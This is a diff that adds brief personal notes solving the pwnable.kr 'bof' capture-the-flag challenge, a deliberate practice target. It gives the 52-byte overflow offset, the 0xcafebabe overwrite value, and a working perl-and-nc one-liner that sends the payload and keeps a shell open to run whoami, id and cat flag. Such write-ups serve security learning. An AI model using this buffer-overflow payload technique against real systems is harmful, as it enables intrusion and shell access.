@@ -1,0 +1,14 @@
+pwnable.kr bof tot3
+
+basically a buffer overflow
+
+we found that a the 52 character it started to overflow
+
+needed to match 0xcafebabe
+
+(perl -e 'print "A"x52 . "\xbe\xba\xfe\xca\n"'; cat -) | nc pwnable.kr 9000
+
+then whoami
+id 
+cat flag
+
